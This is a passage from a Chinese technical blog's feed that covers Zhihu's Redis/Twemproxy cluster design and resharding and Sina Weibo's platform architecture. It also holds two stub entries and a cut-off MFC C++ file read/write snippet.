fnv1a_64 算法结合 modula 模式即取模哈希对 Key 进行分片，底层 Redis 使用单机模式结合 Sentinel 集群实现高可用，默认使用 1 个 Master 节点和 1 个 Slave 节点提供服务，如果业务有更高的可用性要求，可以拓展 Slave 节点。</p><p>当集群中 Master 节点宕机，按照单机模式下的高可用流程进行切换，Twemproxy 在连接断开后会进行重连，对于存储模式下的集群，我们不会设置 auto_eject_hosts, 不会剔除节点。</p><p>同时，对于存储实例，我们默认使用 noeviction 策略，在内存使用超过规定的额度时直接返回 OOM 错误，不会主动进行 Key 的删除，保证数据的完整性。</p><p>由于 Twemproxy 仅进行高性能的命令转发，不进行读写分离，所以默认没有读写分离功能，而在实际使用过程中，我们也没有遇到集群读写分离的需求，如果要进行读写分离，可以使用资源发现策略在 Slave 节点上架设 Twemproxy 集群，由客户端进行读写分离的路由。</p><h3 id="7-2缓存"><a href="#7-2缓存" class="headerlink" title="7.2缓存"></a>7.2缓存</h3><p>考虑到对于后端（MySQL/HBase/RPC 等）的压力，知乎绝大部分业务都没有针对缓存进行降级，这种情况下对缓存的可用性要求较数据的一致性要求更高，但是如果按照存储的主从模式实现高可用，1 个 Slave 节点的部署策略在线上环境只能容忍 1 台物理节点宕机，N 台物理节点宕机高可用就需要至少 N 个 Slave 节点，这无疑是种资源的浪费。</p><p><img src="/案例学习/case-study/zhihu-redis-cluster/114121ihhvve56ihjzh6rj.jpg" alt="知乎技术分享：从单机到2000万QPS并发的Redis高性能缓存实践之路_5.jpg"></p><p>所以我们采用了 Twemproxy 一致性哈希（Consistent Hashing）策略来配合 auto_eject_hosts 自动弹出策略组建 Redis 缓存集群。</p><p>对于缓存我们仍然使用使用 fnv1a_64 算法进行哈希计算，但是分布算法我们使用了 ketama 即一致性哈希进行 Key 分布。缓存节点没有主从，每个分片仅有 1 个 Master 节点承载流量。</p><p>Twemproxy 配置 auto_eject_hosts 会在实例连接失败超过 server_failure_limit 次的情况下剔除节点，并在 server_retry_timeout 超时之后进行重试，剔除后配合 ketama 一致性哈希算法重新计算哈希环，恢复正常使用，这样即使一次宕机多个物理节点仍然能保持服务。</p><p><img src="/案例学习/case-study/zhihu-redis-cluster/114150jrsz42mlm41i29r5.jpg" alt="知乎技术分享：从单机到2000万QPS并发的Redis高性能缓存实践之路_6.jpg"></p><p><strong>在实际的生产环境中需要注意以下几点：</strong></p><ul><li>1）剔除节点后，会造成短时间的命中率下降，后端存储如 MySQL、HBase 等需要做好流量监测；</li><li>2）线上环境缓存后端分片不宜过大，建议维持在 20G 以内，同时分片调度应尽可能分散，这样即使宕机一部分节点，对后端造成的额外的压力也不会太多；</li><li>3）机器宕机重启后，缓存实例需要清空数据之后启动，否则原有的缓存数据和新建立的缓存数据会冲突导致脏缓存。直接不启动缓存也是一种方法，但是在分片宕机期间会导致周期性 server_failure_limit 次数的连接失败；</li><li>4）server_retry_timeout 和 server_failure_limit 需要仔细敲定确认，知乎使用 10min 和 3 次作为配置，即连接失败 3 次后剔除节点，10 分钟后重新进行连接。</li></ul><h3 id="7-3Twemproxy-部署"><a href="#7-3Twemproxy-部署" class="headerlink" title="7.3Twemproxy 部署"></a>7.3Twemproxy 部署</h3><p>在方案早期我们使用数量固定的物理机部署 Twemproxy，通过物理机上的 Agent 启动实例，Agent 在运行期间会对 Twemproxy 进行健康检查与故障恢复，由于 Twemproxy 仅提供全量的使用计数，所以 Agent 运行时还会进行定时的差值计算来计算 Twemproxy 的 requests_per_second 等指标。</p><p>后来为了更好地故障检测和资源调度，我们引入了 Kubernetes，将 Twemproxy 和 Agent 放入同一个 Pod 的两个容器内，底层 Docker 网段的配置使每个 Pod 都能获得独立的 IP，方便管理。</p><p>最开始，本着简单易用的原则，我们使用 DNS A Record 来进行客户端的资源发现，每个 Twemproxy 采用相同的端口号，一个 DNS A Record 后面挂接多个 IP 地址对应多个 Twemproxy 实例。</p><p>初期，这种方案简单易用，但是到了后期流量日益上涨，单集群 Twemproxy 实例个数很快就超过了 20 个。由于 DNS 采用的 UDP 协议有 512 字节的包大小限制，单个 A Record 只能挂接 20 个左右的 IP 地址，超过这个数字就会转换为 TCP 协议，客户端不做处理就会报错，导致客户端启动失败。</p><p>当时由于情况紧急，只能建立多个 Twemproxy Group，提供多个 DNS A Record 给客户端，客户端进行轮询或者随机选择，该方案可用，但是不够优雅。</p><h3 id="7-4如何解决-Twemproxy-单-CPU-计算能力的限制"><a href="#7-4如何解决-Twemproxy-单-CPU-计算能力的限制" class="headerlink" title="7.4如何解决 Twemproxy 单 CPU 计算能力的限制"></a>7.4如何解决 Twemproxy 单 CPU 计算能力的限制</h3><p>之后我们修改了 Twemproxy 源码， 加入 SO_REUSEPORT 支持。</p><p><strong>Twemproxy with SO_REUSEPORT on Kubernetes：</strong></p><p><img src="/案例学习/case-study/zhihu-redis-cluster/114332gge97h1k01gggkhz.jpg" alt="知乎技术分享：从单机到2000万QPS并发的Redis高性能缓存实践之路_7.jpg"></p><p>同一个容器内由 Starter 启动多个 Twemproxy 实例并绑定到同一个端口，由操作系统进行负载均衡，对外仍然暴露一个端口，但是内部已经由系统均摊到了多个 Twemproxy 上。</p><p>同时 Starter 会定时去每个 Twemproxy 的 stats 端口获取 Twemproxy 运行状态进行聚合，此外 Starter 还承载了信号转发的职责。</p><p>原有的 Agent 不需要用来启动 Twemproxy 实例，所以 Monitor 调用 Starter 获取聚合后的 stats 信息进行差值计算，最终对外界暴露出实时的运行状态信息。</p><h3 id="7-5为什么没有使用官方-Redis-集群方案"><a href="#7-5为什么没有使用官方-Redis-集群方案" class="headerlink" title="7.5为什么没有使用官方 Redis 集群方案"></a>7.5为什么没有使用官方 Redis 集群方案</h3><p>我们在 2015 年调研过多种集群方案，综合评估多种方案后，最终选择了看起来较为陈旧的 Twemproxy 而不是官方 Redis 集群方案与 Codis，具体原因如下：</p><p><strong><em>1）MIGRATE 造成的阻塞问题：\</em></strong></p><p>Redis 官方集群方案使用 CRC16 算法计算哈希值并将 Key 分散到 16384 个 Slot 中，由使用方自行分配 Slot 对应到每个分片中，扩容时由使用方自行选择 Slot 并对其进行遍历，对 Slot 中每一个 Key 执行 <a href="https://redis.io/commands/migrate" target="_blank" rel="noopener">MIGRATE</a> 命令进行迁移。</p><p>调研后发现，MIGRATE 命令实现分为三个阶段：</p><ul><li>a）DUMP 阶段：由源实例遍历对应 Key 的内存空间，将 Key 对应的 Redis Object 序列化，序列化协议跟 Redis RDB 过程一致；</li><li>b）RESTORE 阶段：由源实例建立 TCP 连接到对端实例，并将 DUMP 出来的内容使用 RESTORE 命令到对端进行重建，新版本的 Redis 会缓存对端实例的连接；</li><li>c）DEL 阶段（可选）：如果发生迁移失败，可能会造成同名的 Key 同时存在于两个节点，此时 MIGRATE 的 REPLACE 参数决定是是否覆盖对端的同名 Key，如果覆盖，对端的 Key 会进行一次删除操作，4.0 版本之后删除可以异步进行，不会阻塞主进程。</li></ul><p>经过调研，我们认为这种模式并不适合知乎的生产环境。Redis 为了保证迁移的一致性， MIGRATE 所有操作都是同步操作，执行 MIGRATE 时，两端的 Redis 均会进入时长不等的 BLOCK 状态。</p><p>对于小 Key，该时间可以忽略不计，但如果一旦 Key 的内存使用过大，一个 MIGRATE 命令轻则导致 P95 尖刺，重则直接触发集群内的 Failover，造成不必要的切换</p><p>同时，迁移过程中访问到处于迁移中间状态的 Slot 的 Key 时，根据进度可能会产生 ASK 转向，此时需要客户端发送 ASKING 命令到 Slot 所在的另一个分片重新请求，请求时延则会变为原来的两倍。</p><p>同样，方案初期时的 Codis 采用的是相同的 MIGRATE 方案，但是使用 Proxy 控制 Redis 进行迁移操作而非第三方脚本（如 redis-trib.rb），基于同步的类似 MIGRATE 的命令，实际跟 Redis 官方集群方案存在同样的问题。</p><p>对于这种 Huge Key 问题决定权完全在于业务方，有时业务需要不得不产生 Huge Key 时会十分尴尬，如关注列表。一旦业务使用不当出现超过 1MB 以上的大 Key 便会导致数十毫秒的延迟，远高于平时 Redis 亚毫秒级的延迟。有时，在 slot 迁移过程中业务不慎同时写入了多个巨大的 Key 到 slot 迁移的源节点和目标节点，除非写脚本删除这些 Key ，否则迁移会进入进退两难的地步。</p><p>对此，Redis 作者在 Redis 4.2 的 <a href="https://gist.github.com/antirez/a3787d538eec3db381a41654e214b31d" target="_blank" rel="noopener">roadmap</a> 中提到了 Non blocking MIGRATE 但是截至目前，Redis 5.0 即将正式发布，仍未看到有关改动，社区中已经有相关的 <a href="https://github.com/antirez/redis/pull/3997" target="_blank" rel="noopener">Pull Request</a> ，该功能可能会在 5.2 或者 6.0 之后并入 master 分支，对此我们将持续观望。</p><p><strong><em>2）缓存模式下高可用方案不够灵活：\</em></strong></p><p>还有，官方集群方案的高可用策略仅有主从一种，高可用级别跟 Slave 的数量成正相关，如果只有一个 Slave，则只能允许一台物理机器宕机， Redis 4.2 roadmap 提到了 cache-only mode，提供类似于 Twemproxy 的自动剔除后重分片策略，但是截至目前仍未实现。</p><p><strong><em>3）内置 Sentinel 造成额外流量负载：\</em></strong></p><p>另外，官方 Redis 集群方案将 Sentinel 功能内置到 Redis 内，这导致在节点数较多（大于 100）时在 Gossip 阶段会产生大量的 PING/INFO/CLUSTER INFO 流量，根据 issue 中提到的情况，200 个使用 3.2.8 版本节点搭建的 Redis 集群，在没有任何客户端请求的情况下，每个节点仍然会产生 40Mb/s 的流量，虽然到后期 Redis 官方尝试对其进行压缩修复，但按照 Redis 集群机制，节点较多的情况下无论如何都会产生这部分流量，对于使用大内存机器但是使用千兆网卡的用户这是一个值得注意的地方。</p><p><strong><em>4）slot 存储开销：\</em></strong></p><p>最后，每个 Key 对应的 Slot 的存储开销，在规模较大的时候会占用较多内存，4.x 版本以前甚至会达到实际使用内存的数倍，虽然 4.x 版本使用 rax 结构进行存储，但是仍然占据了大量内存，从非官方集群方案迁移到官方集群方案时，需要注意这部分多出来的内存。</p><p>总之，官方 Redis 集群方案与 Codis 方案对于绝大多数场景来说都是非常优秀的解决方案，但是我们仔细调研发现并不是很适合集群数量较多且使用方式多样化的我们，场景不同侧重点也会不一样，但在此仍然要感谢开发这些组件的开发者们，感谢你们对 Redis 社区的贡献。</p><h2 id="8、知乎Redis实例的扩容实践"><a href="#8、知乎Redis实例的扩容实践" class="headerlink" title="8、知乎Redis实例的扩容实践"></a>8、知乎Redis实例的扩容实践</h2><h3 id="8-1静态扩容"><a href="#8-1静态扩容" class="headerlink" title="8.1静态扩容"></a>8.1静态扩容</h3><p>对于单机实例，如果通过调度器观察到对应的机器仍然有空闲的内存，我们仅需直接调整实例的 maxmemory 配置与报警即可。同样，对于集群实例，我们通过调度器观察每个节点所在的机器，如果所有节点所在机器均有空闲内存，我们会像扩容单机实例一样直接更新 maxmemory 与报警。</p><h3 id="8-2动态扩容"><a href="#8-2动态扩容" class="headerlink" title="8.2动态扩容"></a>8.2动态扩容</h3><p><strong>但是当机器空闲内存不够，或单机实例与集群的后端实例过大时，无法直接扩容，需要进行动态扩容：</strong></p><ul><li>1）对于单机实例，如果单实例超过 30GB 且没有如 sinterstore 之类的多 Key 操作我们会将其扩容为集群实例；</li><li>2）对于集群实例，我们会进行横向的重分片，我们称之为 Resharding 过程。</li></ul><p><strong>Resharding 过程：</strong></p><p><img src="/案例学习/case-study/zhihu-redis-cluster/114953wmhqq70txgtkbtqy.jpg" alt="知乎技术分享：从单机到2000万QPS并发的Redis高性能缓存实践之路_8.jpg"></p><p>原生 Twemproxy 集群方案并不支持扩容，我们开发了数据迁移工具来进行 Twemproxy 的扩容，迁移工具本质上是一个上下游之间的代理，将数据从上游按照新的分片方式搬运到下游。</p><p>原生 Redis 主从同步使用 SYNC/PSYNC 命令建立主从连接，收到 SYNC 命令的 Master 会 fork 出一个进程遍历内存空间生成 RDB 文件并发送给 Slave，期间所有发送至 Master 的写命令在执行的同时都会被缓存到内存的缓冲区内，当 RDB 发送完成后，Master 会将缓冲区内的命令及之后的写命令转发给 Slave 节点。</p><p>我们开发的迁移代理会向上游发送 SYNC 命令模拟上游实例的 Slave，代理收到 RDB 后进行解析，由于 RDB 中每个 Key 的格式与 RESTORE 命令的格式相同，所以我们使用生成 RESTORE 命令按照下游的 Key 重新计算哈希并使用 Pipeline 批量发送给下游。</p><p>等待 RDB 转发完成后，我们按照新的后端生成新的 Twemproxy 配置，并按照新的 Twemproxy 配置建立 Canary 实例，从上游的 Redis 后端中取 Key 进行测试，测试 Resharding 过程是否正确，测试过程中的 Key 按照大小，类型，TTL 进行比较。</p><p>测试通过后，对于集群实例，我们使用生成好的配置替代原有 Twemproxy 配置并 restart/reload Twemproxy 代理，我们修改了 Twemproxy 代码，加入了 config reload 功能，但是实际使用中发现直接重启实例更加可控。而对于单机实例，由于单机实例和集群实例对于命令的支持不同，通常需要和业务方确定后手动重启切换。</p><p>由于 Twemproxy 部署于 Kubernetes ，我们可以实现细粒度的灰度，如果客户端接入了读写分离，我们可以先将读流量接入新集群，最终接入全部流量。</p><p>这样相对于 Redis 官方集群方案，除在上游进行 BGSAVE 时的 fork 复制页表时造成的尖刺以及重启时造成的连接闪断，其余对于 Redis 上游造成的影响微乎其微。</p><p><strong>这样扩容存在的问题：</strong></p><p><em>1）对上游发送 SYNC 后，上游 fork 时会造成尖刺：</em></p><ul><li>- 对于存储实例，我们使用 Slave 进行数据同步，不会影响到接收请求的 Master 节点；</li><li>- 对于缓存实例，由于没有 Slave 实例，该尖刺无法避免，如果对于尖刺过于敏感，我们可以跳过 RDB 阶段，直接通过 PSYNC 使用最新的 SET 消息建立下游的缓存。</li></ul><p><em>2）切换过程中有可能写到下游，而读在上游：</em></p><ul><li>- 对于接入了读写分离的客户端，我们会先切换读流量到下游实例，再切换写流量。</li></ul><p><em>3）一致性问题，两条具有先后顺序的写同一个 Key 命令在切换代理后端时会通过 1）写上游同步到下游 2）直接写到下游两种方式写到下游，此时，可能存在应先执行的命令却通过 1）执行落后于通过 2）执行，导致命令先后顺序倒置：</em></p><ul><li>- 这个问题在切换过程中无法避免，好在绝大部分应用没有这种问题，如果无法接受，只能通过上游停写排空 Resharding 代理保证先后顺序；</li><li>- 官方 Redis 集群方案和 Codis 会通过 blocking 的 migrate 命令来保证一致性，不存在这种问题。</li></ul><p>实际使用过程中，如果上游分片安排合理，可实现数千万次每秒的迁移速度，1TB 的实例 Resharding 只需要半小时左右。另外，对于实际生产环境来说，提前做好预期规划比遇到问题紧急扩容要快且安全得多。</p><h2 id="9、旁路分析实践"><a href="#9、旁路分析实践" class="headerlink" title="9、旁路分析实践"></a>9、旁路分析实践</h2><p>由于生产环境调试需要，有时会需要监控线上 Redis 实例的访问情况，Redis 提供了多种监控手段，如 MONITOR 命令。</p><p>但由于 Redis 单线程的限制，导致自带的 MONITOR 命令在负载过高的情况下会再次跑高 CPU，对于生产环境来说过于危险，而其余方式如 <a href="https://redis.io/topics/notifications" target="_blank" rel="noopener">Keyspace Notify</a> 只有写事件，没有读事件，无法做到细致的观察。</p><p>对此我们开发了基于 libpcap 的旁路分析工具，系统层面复制流量，对应用层流量进行协议分析，实现旁路 MONITOR，实测对于运行中的实例影响微乎其微。</p><p>同时对于没有 MONITOR 命令的 Twemproxy，旁路分析工具仍能进行分析，由于生产环境中绝大部分业务都使用 Kubernetes 部署于 Docker 内 ，每个容器都有对应的独立 IP，所以可以使用旁路分析工具反向解析找出客户端所在的应用，分析业务方的使用模式，防止不正常的使用。</p><h2 id="10、将来的工作"><a href="#10、将来的工作" class="headerlink" title="10、将来的工作"></a>10、将来的工作</h2><p>由于 Redis 5.0 发布在即，4.0 版本趋于稳定，我们将逐步升级实例到 4.0 版本，由此带来的如 MEMORY 命令、Redis Module 、新的 LFU 算法等特性无论对运维方还是业务方都有极大的帮助。</p><h2 id="11、写在最后"><a href="#11、写在最后" class="headerlink" title="11、写在最后"></a>11、写在最后</h2><p>知乎架构平台团队是支撑整个知乎业务的基础技术团队，开发和维护着知乎几乎全量的核心基础组件，包括容器、Redis、MySQL、Kafka、LB、HBase 等核心基础设施，团队小而精，每个同学都独当一面负责上面提到的某个核心系统。</p><p>随着知乎业务规模的快速增长，以及业务复杂度的持续增加，我们团队面临的技术挑战也越来越大，欢迎对技术感兴趣、渴望技术挑战的小伙伴加入我们，一起建设稳定高效的知乎云平台。</p>]]></content>
      
      
      <categories>
          
          <category> 案例学习 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>【转载】亿级用户下的新浪微博平台架构</title>
      <link href="/%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0/case-study/sina-weibo/"/>
      <url>/%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0/case-study/sina-weibo/</url>
      
        <content type="html"><![CDATA[<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>新浪微博在 2014 年 3 月公布的月活跃用户（MAU）已经达到 1.43 亿，2014 年新年第一分钟发送的微博达 808298 条，如此巨大的用户规模和业务量，需要高可用（HA）、高并发访问、低延时的强大后台系统支撑。</p><p>微博平台第一代架构为 LAMP 架构，数据库使用的是 MyIsam，后台用的是 php，缓存为 Memcache。</p><p>随着应用规模的增长，衍生出的第二代架构对业务功能进行了模块化、服务化和组件化，后台系统从 php 替换为 Java，逐渐形成 SOA 架构，在很长一段时间支撑了微博平台的业务发展。</p><p>在此基础上又经过长时间的重构、线上运行、思索与沉淀，平台形成了第三代架构体系。</p><p>我们先看一张微博的核心业务图（如下），是不是非常复杂？但这已经是一个简化的不能再简化的业务图了，第三代技术体系就是为了保障在微博核心业务上快速、高效、可靠地发布新产品新功能。</p><p><img src="/案例学习/case-study/sina-weibo/eaede3ca4a378072c41bc84afa549b76.png" alt="亿级用户下的新浪微博平台架构"></p><h2 id="第三代技术体系"><a href="#第三代技术体系" class="headerlink" title="第三代技术体系"></a>第三代技术体系</h2><p>微博平台的第三代技术体系，使用正交分解法建立模型：在水平方向，采用典型的三级分层模型，即接口层、服务层与资源层；在垂直方向，进一步细分为业务架构、技术架构、监控平台与服务治理平台。下面是平台的整体架构图：</p><p><img src="/案例学习/case-study/sina-weibo/9806c57d77da35fe0d5c1c3cc06e6178.png" alt="亿级用户下的新浪微博平台架构"></p><p>如上图所示，正交分解法将整个图分解为 3*4=12 个区域，每个区域代表一个水平维度与一个垂直维度的交点，相应的定义这个区域的核心功能点，比如区域 5 主要完成服务层的技术架构。</p><p>下面详细介绍水平方向与垂直方向的设计原则，尤其会重点介绍 4、5、6 中的技术组件及其在整个架构体系中的作用。</p><h2 id="水平分层"><a href="#水平分层" class="headerlink" title="水平分层"></a>水平分层</h2><p>水平维度的划分，在大中型互联网后台业务系统的设计中非常基础，在平台的每一代技术体系中都有体现。这里还是简单介绍一下，为后续垂直维度的延伸讲解做铺垫：</p><ol><li>接口层主要实现与 Web 页面、移动客户端的接口交互，定义统一的接口规范，平台最核心的三个接口服务分别是内容（Feed）服务、用户关系服务及通讯服务（单发私信、群发、群聊）。</li><li>服务层主要把核心业务模块化、服务化，这里又分为两类服务，一类为原子服务，其定义是不依赖任何其他服务的服务模块，比如常用的短链服务、发号器服务都属于这一类。图中使用泳道隔离，表示它们的独立性。另外一类为组合服务，通过各种原子服务和业务逻辑的组合来完成服务，比如 Feed 服务、通讯服务，它们除了本身的业务逻辑，还依赖短链、用户及发号器服务。</li><li>资源层主要是数据模型的存储，包含通用的缓存资源 Redis 和 Memcached，以及持久化数据库存储 MySQL、HBase，或者分布式文件系统 TFS 以及 Sina S3 服务。</li></ol><p>水平分层有一个特点，依赖关系都是从上往下，上层的服务依赖下层，下层的服务不会依赖上层，构建了一种简单直接的依赖关系。</p><p>与分层模型相对应，微博系统中的服务器主要包括三种类型：前端机（提供 API 接口服务）、队列机（处理上行业务逻辑，主要是数据写入）和存储（mc、mysql、mcq、redis 、HBase 等）。</p><h2 id="垂直延伸技术架构"><a href="#垂直延伸技术架构" class="headerlink" title="垂直延伸技术架构"></a>垂直延伸技术架构</h2><p>随着业务架构的发展和优化，平台研发实现了许多卓越的中间件产品，用来支撑核心业务，这些中间件由业务驱动产生，随着技术组件越来越丰富，形成完备的平台技术框架，大大提升了平台的产品研发效率和业务运行稳定性。</p><p>区别于水平方向上层依赖下层的关系，垂直方向以技术框架为地基支撑点，向两侧驱动影响业务架构、监控平台、服务治理平台，下面介绍一下其中的核心组件。</p><h2 id="接口层-Web-V4-框架"><a href="#接口层-Web-V4-框架" class="headerlink" title="接口层 Web V4 框架"></a>接口层 Web V4 框架</h2><p>接口框架简化和规范了业务接口开发工作，将通用的接口层功能打包到框架中，采用了 Spring 的面向切面（AOP）设计理念。接口框架基于 Jersey 进行二次开发，基于 annotation 定义接口 (url, 参数)，内置 Auth、频次控制、访问日志、降级功能，支撑接口层监控平台与服务治理，同时还有自动化的 Bean-json/xml 序列化。</p><h2 id="服务层框架"><a href="#服务层框架" class="headerlink" title="服务层框架"></a>服务层框架</h2><p>服务层主要涉及 RPC 远程调用框架以及消息队列框架，这是微博平台在服务层使用最为广泛的两个框架。</p><h3 id="MCQ-消息队列"><a href="#MCQ-消息队列" class="headerlink" title="MCQ 消息队列"></a>MCQ 消息队列</h3><p>消息队列提供一种先入先出的通讯机制，在平台内部，最常见的场景是将数据的落地操作异步写入队列，队列处理程序批量读取并写入 DB，消息队列提供的异步机制加快了前端机的响应时间，其次，批量的 DB 操作也间接提高了 DB 操作性能，另外一个应用场景，平台通过消息队列，向搜索、大数据、商业运营部门提供实时数据。</p><p>微博平台内部大量使用的 MCQ(SimpleQueue Service Over Memcache) 消息队列服务，基于 MemCache 协议，消息数据持久化写入 BerkeleyDB，只有 get/set 两个命令，同时也非常容易做监控（stats queue），有丰富的 client library，线上运行多年，性能比通用的 MQ 高很多倍。</p><h3 id="Motan-RPC-框架"><a href="#Motan-RPC-框架" class="headerlink" title="Motan RPC 框架"></a>Motan RPC 框架</h3><p>微博的 Motan RPC 服务，底层通讯引擎采用了 Netty 网络框架，序列化协议支持 Hessian 和 Java 序列化，通讯协议支持 Motan、http、tcp、mc 等，Motan 框架在内部大量使用，在系统的健壮性和服务治理方面，有较为成熟的技术解决方案，健壮性上，基于 Config 配置管理服务实现了 High Availability 与 Load Balance 策略（支持灵活的 FailOver 和 FailFast HA 策略，以及 Round Robin、LRU、Consistent Hash 等 Load Balance 策略），服务治理方面，生成完整的服务调用链数据，服务请求性能数据，响应时间（Response Time）、QPS 以及标准化 Error、Exception 日志信息。</p><h2 id="资源层框架"><a href="#资源层框架" class="headerlink" title="资源层框架"></a>资源层框架</h2><p>资源层的框架非常多，有封装 MySQL 与 HBase 的 Key-List DAL 中间件、有定制化的计数组件，有支持分布式 MC 与 Redis 的 Proxy，在这些方面业界有较多的经验分享，我在这里分享一下平台架构的对象库与 SSD Cache 组件。</p><h3 id="对象库"><a href="#对象库" class="headerlink" title="对象库"></a>对象库</h3><p>对象库支持便捷的序列化与反序列化微博中的对象数据：序列化时，将 JVM 内存中的对象序列化写入在 HBase 中并生成唯一的 ObjectID，当需要访问该对象时，通过 ObjectID 读取，对象库支持任意类型的对象，支持 PB、JSON、二进制序列化协议，微博中最大的应用场景将微博中引用的视频、图片、文章统一定义为对象，一共定义了几十种对象类型，并抽象出标准的对象元数据 Schema，对象的内容上传到对象存储系统（Sina S3）中，对象元数据中保存 Sina S3 的下载地址。</p><h3 id="SSDCache"><a href="#SSDCache" class="headerlink" title="SSDCache"></a>SSDCache</h3><p>随着 SSD 硬盘的普及，优越的 IO 性能使其被越来越多地用于替换传统的 SATA 和 SAS 磁盘，常见的应用场景有三种：1）替换 MySQL 数据库的硬盘，目前社区还没有针对 SSD 优化的 MySQL 版本，即使这样，直接升级 SSD 硬盘也能带来 8 倍左右的 IOPS 提升；2）替换 Redis 的硬盘，提升其性能；3）用在 CDN 中，加快静态资源加载速度。</p><p>微博平台将 SSD 应用在分布式缓存场景中，将传统的 Redis/MC + Mysql 方式，扩展为 Redis/MC + SSD Cache + Mysql 方式，SSD Cache 作为 L2 缓存使用，第一降低了 MC/Redis 成本过高，容量小的问题，也解决了穿透 DB 带来的数据库访问压力。</p><h2 id="垂直的监控与服务治理"><a href="#垂直的监控与服务治理" class="headerlink" title="垂直的监控与服务治理"></a>垂直的监控与服务治理</h2><p>随着服务规模和业务变得越来越复杂，即使业务架构师也很难准确地描述服务之间的依赖关系，服务的管理运维变得越来难，在这个背景下，参考 google 的 dapper 和 twitter 的 zipkin，平台实现了自己的大型分布式追踪系统 WatchMan。</p><h3 id="WatchMan-大型分布式追踪系统"><a href="#WatchMan-大型分布式追踪系统" class="headerlink" title="WatchMan 大型分布式追踪系统"></a>WatchMan 大型分布式追踪系统</h3><p>如其他大中型互联网应用一样，微博平台由众多的分布式组件构成，用户通过浏览器或移动客户端的每一个 HTTP 请求到达应用服务器后，会经过很多个业务系统或系统组件，并留下足迹（footprint）。但是这些分散的数据对于问题排查，或是流程优化都帮助有限。对于这样一种典型的跨进程 / 跨线程的场景，汇总收集并分析这类日志就显得尤为重要。另一方面，收集每一处足迹的性能数据，并根据策略对各子系统做流控或降级，也是确保微博平台高可用的重要因素。要能做到追踪每个请求的完整调用链路；收集调用链路上每个服务的性能数据；能追踪系统中所有的 Error 和 Exception；通过计算性能数据和比对性能指标（SLA）再回馈到控制流程（control flow）中，基于这些目标就诞生了微博的 Watchman 系统。</p><p>该系统设计的一个核心原则就是低侵入性（non-invasivenss）：作为非业务组件，应当尽可能少侵入或者不侵入其他业务系统，保持对使用方的透明性，可以大大减少开发人员的负担和接入门槛。基于此考虑，所有的日志采集点都分布在技术框架中间件中，包括接口框架、RPC 框架以及其他资源中间件。</p><p>WatchMan 由技术团队搭建框架，应用在所有业务场景中，运维基于此系统完善监控平台，业务和运维共同使用此系统，完成分布式服务治理，包括服务扩容与缩容、服务降级、流量切换、服务发布与灰度。</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>现在，技术框架在平台发挥着越来越重要的作用，驱动着平台的技术升级、业务开发、系统运维服务，本文限于篇幅限制，没有展开介绍，后续会不断地介绍核心中间件的设计原则和系统架构。</p><p>本文<a href="http://mp.weixin.qq.com/s?__biz=MzA4ODAyOTI4Ng==&amp;mid=201317014&amp;idx=1&amp;sn=51d985f13d2d22f7c49654ef7cda0167#rd" target="_blank" rel="noopener">首发</a>于“微博平台架构”微信公众号，发布时有少量的文字润色和调整。</p><h2 id="关于作者"><a href="#关于作者" class="headerlink" title="关于作者"></a>关于作者</h2><p>卫向军（<a href="http://weibo.com/xiangjunwei" target="_blank" rel="noopener"> @卫向军 _ 微博</a>），毕业于北京邮电大学，现任微博平台架构师，先后在微软、金山云、新浪微博从事技术研发工作，专注于系统架构设计、音视频通讯系统、分布式文件系统和数据挖掘等领域。</p>]]></content>
      
      
      <categories>
          
          <category> 案例学习 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring batch</title>
      <link href="/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/spring-batch/"/>
      <url>/%E6%8A%80%E6%9C%AF%E7%BB%84%E4%BB%B6/tech-components/spring-batch/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2>]]></content>
      
      
      <categories>
          
          <category> 技术组件 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>并发框架</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/Disruptor/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/Disruptor/</url>
      
        <content type="html"><![CDATA[<p>Disruptor它是一个开源的并发框架，并获得<a href="http://www.java.net/dukeschoice" target="_blank" rel="noopener">2011 Duke’s </a>程序框架创新奖，能够在无锁的情况下实现网络的Queue并发操作。</p>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>文件操作</title>
      <link href="/c-c/c&amp;c++/vc-file/"/>
      <url>/c-c/c&amp;c++/vc-file/</url>
      
        <content type="html"><![CDATA[<pre><code>查找文件代码：CString strFileTitle; CFileFind finder; BOOL bWorking = finder.FindFile(&quot;D:\\*.txt&quot;); while(bWorking) { bWorking=finder.FindNextFile(); //strFileTitle=finder.GetFileTitle(); //只有文件名字//strFileTitle=finder.GetFileName(); //包含了后缀名//strFileTitle=finder.GetFileURL(); //文件路径strFileTitle=finder.GetRoot(); // 获取根目录AfxMessageBox(strFileTitle);}文件读操作：char sRead[10]; CFile mFile(_T(&quot;D:\\file.txt&quot;),CFile::modeRead); if(mFile.GetLength()&lt;10) return; mFile.Read(sRead,10);CString k;k.Format(&quot;%s&quot;,sRead);AfxMessageBox(k);mFile.Close();    文件写操作：CFile mFile(_T(&quot;user.txt &quot;), CFile::modeWrite|CFile::modeCreate);mFile.Write(sRead,2);mFile.Flush();mFile.Close();CArchive方法：写操作CString strTemp;CFile mFile;mFile.Open(&quot;D:\\file1.txt&quot;,CFile::modeCreate|CFile::modeNoTruncate|CFile::modeWrite);CArchive ar(&amp;mFile,CArchive::store); //创建文件了CString y=&quot;fuck you&quot;;ar&lt;&lt;y;ar.Close();mFile.Close();读操作：　CFile mFile; 　　if(mFile.Open(&quot;d:\\dd\\try.TRY&quot;,CFile::modeRead)==0) 　　return; 　　CArchive ar(&amp;mFile,CArchive::load); 　 　ar&gt;&gt;strTemp; 　 ar.Close(); 　　mFile.Close();　如果你要进行的文件操作只是简单的读写整行的字符串，我建议你使用CStdioFileCStdioFile mFile;CFileException mExcept;mFile.Open( &quot;d:\\temp\\aa.bat&quot;, CFile::modeWrite, &amp;mExcept); //只能打开已经存在的文件CString string=&quot;I am a string.&quot;;mFile.WriteString(string);mFile.Close();　4．临时文件的使用 　　